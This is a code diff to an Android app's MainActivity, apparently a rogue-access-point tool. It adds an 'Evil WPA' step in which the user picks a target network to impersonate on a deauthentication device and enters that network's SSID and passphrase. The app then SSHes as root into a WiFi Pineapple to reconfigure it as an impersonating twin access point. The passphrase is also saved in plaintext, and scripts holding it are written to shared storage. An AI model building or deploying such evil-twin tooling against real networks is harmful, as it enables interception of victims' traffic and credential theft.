@@ -143,17 +143,34 @@ class MainActivity : AppCompatActivity() {
                 appendLog(textView, "Attempt $attempt: Setting up SSH keys and scripts...\n")
                 step3Success = setupPrerequisites(textView)
                 if (!step3Success && isRunning.get()) {
-                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
-                    Thread.sleep(10000)
+                    appendLog(textView, "⚠️ Retrying in 5 seconds...\n\n")
+                    Thread.sleep(5000)
                     attempt++
                 }
             }
             if (!isRunning.get()) return
             appendLog(textView, "✅ Step 3 complete!\n\n")
 
-            // Step 4: Start relay service with continuous monitoring and auto-recovery
+            // Step 4: Configure Evil WPA network
             if (!isRunning.get()) return
-            appendLog(textView, "=== STEP 4: STARTING RELAY SERVICE ===\n")
+            appendLog(textView, "=== STEP 4: CONFIGURING EVIL WPA NETWORK ===\n")
+            var step3_5Success = false
+            attempt = 1
+            while (!step3_5Success && isRunning.get()) {
+                appendLog(textView, "Attempt $attempt: Configuring target network settings...\n")
+                step3_5Success = configureEvilWPA(textView)
+                if (!step3_5Success && isRunning.get()) {
+                    appendLog(textView, "⚠️ Retrying in 10 seconds...\n\n")
+                    Thread.sleep(10000)
+                    attempt++
+                }
+            }
+            if (!isRunning.get()) return
+            appendLog(textView, "✅ Step 4 complete!\n\n")
+
+            // Step 5: Start relay service with continuous monitoring and auto-recovery
+            if (!isRunning.get()) return
+            appendLog(textView, "=== STEP 5: STARTING RELAY SERVICE ===\n")
             
             // Continuous loop that will restart the service if it fails
             while (isRunning.get()) {
@@ -188,7 +205,7 @@ class MainActivity : AppCompatActivity() {
                 if (monitorResult == MonitorResult.DNS_ERROR || monitorResult == MonitorResult.SERVICE_FAILED) {
                     appendLog(textView, "\n⚠️ Service failure detected! Restarting in 10 seconds...\n\n")
                     Thread.sleep(10000)
-                    appendLog(textView, "=== RESTARTING STEP 4: RELAY SERVICE ===\n")
+                    appendLog(textView, "=== RESTARTING STEP 5: RELAY SERVICE ===\n")
                 } else {
                     // User stopped or unknown error
                     break
@@ -212,6 +229,126 @@ class MainActivity : AppCompatActivity() {
         DNS_ERROR,
         SERVICE_FAILED,
         UNKNOWN_ERROR
+    }
+
+    private fun configureEvilWPA(textView: TextView): Boolean {
+        try {
+            // First, remind user to select target network
+            appendLog(textView, "=== TARGET NETWORK CONFIGURATION ===\n")
+            
+            val userConfirmed = showNetworkSelectionReminder(textView)
+            if (!userConfirmed) {
+                appendLog(textView, "❌ User cancelled network selection reminder\n")
+                return false
+            }
+            
+            appendLog(textView, "✅ User confirmed target network is selected\n")
+            
+            // Now prompt for SSID and Passphrase
+            val networkCredentials = promptForNetworkCredentials(textView)
+            if (networkCredentials == null) {
+                appendLog(textView, "❌ Network credentials input cancelled\n")
+                return false
+            }
+            
+            val (ssid, passphrase) = networkCredentials
+            appendLog(textView, "✅ Target SSID: $ssid\n")
+            appendLog(textView, "⚙️ Configuring Evil WPA on Pineapple...\n")
+
+            // Create script that uses the exact command structure from the requirement
+            val configScript = """
+                #!/data/data/com.termux/files/usr/bin/bash
+                export HOME=/data/data/com.termux/files/home
+                export PREFIX=/data/data/com.termux/files/usr
+                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
+                cd "${'$'}HOME"
+                
+                IFS= read -r -d '' SSID <<'EOF'
+                $ssid
+                EOF
+                IFS= read -r -d '' PSK <<'EOF'
+                $passphrase
+                EOF
+                SSID_B64=${'$'}(printf '%s' "${'$'}SSID" | base64)
+                PSK_B64=${'$'}(printf '%s' "${'$'}PSK" | base64)
+                
+                ssh -i .ssh/pineapple -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@172.16.42.1 "
+                  uci set wireless.@wifi-iface[3].ssid=\"\${'$'}(echo ${'$'}SSID_B64 | base64 -d)\"
+                  uci set wireless.@wifi-iface[3].key=\"\${'$'}(echo ${'$'}PSK_B64 | base64 -d)\"
+                  wifi reload
+                "
+                
+                exit ${'$'}?
+            """.trimIndent()
+
+            val configPath = "/sdcard/configure_evil_wpa.sh"
+            writeFileAsRoot(configPath, configScript)
+            execAsRoot("chmod 644 $configPath")
+
+            val pipeline = "cat $configPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
+            val exitCode = proc.waitFor()
+
+            if (exitCode == 0) {
+                appendLog(textView, "✅ Evil WPA configured successfully\n")
+                appendLog(textView, "✅ WiFi reload triggered on Pineapple\n")
+                
+                // Save network credentials for future reference
+                saveNetworkCredentials(ssid, passphrase)
+                
+                return true
+            } else {
+                appendLog(textView, "❌ Failed to configure Evil WPA (exit code: $exitCode)\n")
+                return false
+            }
+
+        } catch (e: Exception) {
+            appendLog(textView, "❌ Exception: ${e.message}\n")
+            return false
+        }
+    }
+
+    private fun showNetworkSelectionReminder(textView: TextView): Boolean {
+        var result = false
+        val latch = java.util.concurrent.CountDownLatch(1)
+        var dialog: android.app.AlertDialog? = null
+
+        runOnUiThread {
+            dialog = android.app.AlertDialog.Builder(this@MainActivity)
+                .setTitle("⚠️ Important Reminder")
+                .setMessage("Before continuing, please:\n\n" +
+                        "1. Identify the TARGET NETWORK you want to impersonate\n" +
+                        "2. Select the TARGET NETWORK on your deauthentication device\n\n" +
+                        "Click OK once you have selected the target network.")
+                .setPositiveButton("OK") { _, _ ->
+                    result = true
+                    latch.countDown()
+                }
+                .setNegativeButton("Cancel") { _, _ ->
+                    result = false
+                    latch.countDown()
+                }
+                .setCancelable(false)
+                .create()
+
+            dialog?.show()
+        }
+
+        // Monitor for stop button while waiting
+        Thread {
+            while (latch.count > 0 && isRunning.get()) {
+                Thread.sleep(100)
+            }
+            if (!isRunning.get()) {
+                runOnUiThread { 
+                    dialog?.dismiss()
+                }
+                latch.countDown()
+            }
+        }.start()
+
+        latch.await()
+        return result && isRunning.get()
     }
 
     private fun checkTermuxInstallation(textView: TextView): Boolean {
@@ -906,6 +1043,37 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    private fun saveNetworkCredentials(ssid: String, passphrase: String) {
+        try {
+            val saveScript = """
+                #!/data/data/com.termux/files/usr/bin/bash
+                export HOME=/data/data/com.termux/files/home
+                cd "${'$'}HOME"
+            
+                IFS= read -r -d '' SSID <<'EOF'
+                $ssid
+                EOF
+                IFS= read -r -d '' PSK <<'EOF'
+                $passphrase
+                EOF
+            
+                printf '%s' "${'$'}SSID" > last-ssid.txt
+                printf '%s' "${'$'}PSK" > last-passphrase.txt
+            
+                echo 'SAVE:SUCCESS'
+            """.trimIndent()
+
+            val savePath = "/sdcard/save_network_creds.sh"
+            writeFileAsRoot(savePath, saveScript)
+            execAsRoot("chmod 644 $savePath")
+
+            val pipeline = "cat $savePath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+            Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline)).waitFor()
+        } catch (e: Exception) {
+            // Ignore save failure
+        }
+    }
+
     private fun promptForDomain(textView: TextView): String? {
         // Try to load last URL to show as hint
         var lastUrl = ""
@@ -933,6 +1101,7 @@ class MainActivity : AppCompatActivity() {
 
         var result: String? = null
         val latch = java.util.concurrent.CountDownLatch(1)
+        var dialog: android.app.AlertDialog? = null
 
         runOnUiThread {
             val input = EditText(this@MainActivity)
@@ -951,7 +1120,7 @@ class MainActivity : AppCompatActivity() {
                 "Enter the WordPress domain (https:// will be added automatically):"
             }
 
-            val dialog = android.app.AlertDialog.Builder(this@MainActivity)
+            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                 .setTitle("Enter WordPress Domain")
                 .setMessage(message)
                 .setView(input)
@@ -971,23 +1140,145 @@ class MainActivity : AppCompatActivity() {
                 .setCancelable(false)
                 .create()
 
-            dialog.show()
+            dialog?.show()
         }
 
+        // Monitor for stop button while waiting
+        Thread {
+            while (latch.count > 0 && isRunning.get()) {
+                Thread.sleep(100)
+            }
+            if (!isRunning.get()) {
+                runOnUiThread { 
+                    dialog?.dismiss()
+                }
+                latch.countDown()
+            }
+        }.start()
+
         latch.await()
-        return result
+        return if (isRunning.get()) result else null
+    }
+
+    private fun promptForNetworkCredentials(textView: TextView): Pair<String, String>? {
+        // Try to load last used credentials to show as hint
+        var lastSsid = ""
+        var lastPassphrase = ""
+        try {
+            val readScript = """
+                #!/data/data/com.termux/files/usr/bin/bash
+                export HOME=/data/data/com.termux/files/home
+                cd "${'$'}HOME"
+                if [ -f last-ssid.txt ]; then
+                    cat last-ssid.txt
+                fi
+                echo "---SEPARATOR---"
+                if [ -f last-passphrase.txt ]; then
+                    cat last-passphrase.txt
+                fi
+            """.trimIndent()
+
+            val readPath = "/sdcard/read_network_creds.sh"
+            writeFileAsRoot(readPath, readScript)
+            execAsRoot("chmod 644 $readPath")
+
+            val pipeline = "cat $readPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
+            val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", pipeline))
+            val output = BufferedReader(InputStreamReader(proc.inputStream)).use { it.readText() }
+            proc.waitFor()
+
+            val parts = output.split("---SEPARATOR---")
+            if (parts.size == 2) {
+                lastSsid = parts[0].trim()
+                lastPassphrase = parts[1].trim()
+            }
+        } catch (e: Exception) {
+            // Continue without hint
+        }
+
+        var result: Pair<String, String>? = null
+        val latch = java.util.concurrent.CountDownLatch(1)
+        var dialog: android.app.AlertDialog? = null
+
+        runOnUiThread {
+            val layout = android.widget.LinearLayout(this@MainActivity)
+            layout.orientation = android.widget.LinearLayout.VERTICAL
+            layout.setPadding(50, 20, 50, 20)
+
+            val ssidInput = EditText(this@MainActivity)
+            ssidInput.hint = "Network SSID"
+            ssidInput.inputType = InputType.TYPE_CLASS_TEXT
+
+            val passphraseInput = EditText(this@MainActivity)
+            passphraseInput.hint = "Network Passphrase"
+            passphraseInput.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
+
+            // Pre-fill with last used credentials if available
+            if (lastSsid.isNotEmpty()) {
+                ssidInput.setText(lastSsid)
+            }
+            if (lastPassphrase.isNotEmpty()) {
+                passphraseInput.setText(lastPassphrase)
+            }
+
+            layout.addView(ssidInput)
+            layout.addView(passphraseInput)
+
+            val message = if (lastSsid.isNotEmpty() && lastPassphrase.isNotEmpty()) {
+                "Enter the target network credentials:\n\nLast used SSID: $lastSsid"
+            } else {
+                "Enter the target network credentials that Evil WPA will impersonate:"
+            }
+
+            dialog = android.app.AlertDialog.Builder(this@MainActivity)
+                .setTitle("Configure Evil WPA")
+                .setMessage(message)
+                .setView(layout)
+                .setPositiveButton("OK") { _, _ ->
+                    val ssid = ssidInput.text.toString().trim()
+                    val passphrase = passphraseInput.text.toString().trim()
+                    if (ssid.isNotEmpty() && passphrase.isNotEmpty()) {
+                        result = Pair(ssid, passphrase)
+                    }
+                    latch.countDown()
+                }
+                .setNegativeButton("Cancel") { _, _ ->
+                    latch.countDown()
+                }
+                .setCancelable(false)
+                .create()
+
+            dialog?.show()
+        }
+
+        // Monitor for stop button while waiting
+        Thread {
+            while (latch.count > 0 && isRunning.get()) {
+                Thread.sleep(100)
+            }
+            if (!isRunning.get()) {
+                runOnUiThread { 
+                    dialog?.dismiss()
+                }
+                latch.countDown()
+            }
+        }.start()
+
+        latch.await()
+        return if (isRunning.get()) result else null
     }
 
     private fun promptForPassword(textView: TextView, title: String, message: String): String? {
         var result: String? = null
         val latch = java.util.concurrent.CountDownLatch(1)
+        var dialog: android.app.AlertDialog? = null
 
         runOnUiThread {
             val input = EditText(this@MainActivity)
             input.hint = "Password"
             input.inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
 
-            val dialog = android.app.AlertDialog.Builder(this@MainActivity)
+            dialog = android.app.AlertDialog.Builder(this@MainActivity)
                 .setTitle(title)
                 .setMessage(message)
                 .setView(input)
@@ -1001,11 +1292,24 @@ class MainActivity : AppCompatActivity() {
                 .setCancelable(false)
                 .create()
 
-            dialog.show()
+            dialog?.show()
         }
 
+        // Monitor for stop button while waiting
+        Thread {
+            while (latch.count > 0 && isRunning.get()) {
+                Thread.sleep(100)
+            }
+            if (!isRunning.get()) {
+                runOnUiThread { 
+                    dialog?.dismiss()
+                }
+                latch.countDown()
+            }
+        }.start()
+
         latch.await()
-        return if (result.isNullOrEmpty()) null else result
+        return if (isRunning.get() && !result.isNullOrEmpty()) result else null
     }
 
     private fun appendLog(textView: TextView, message: String) {
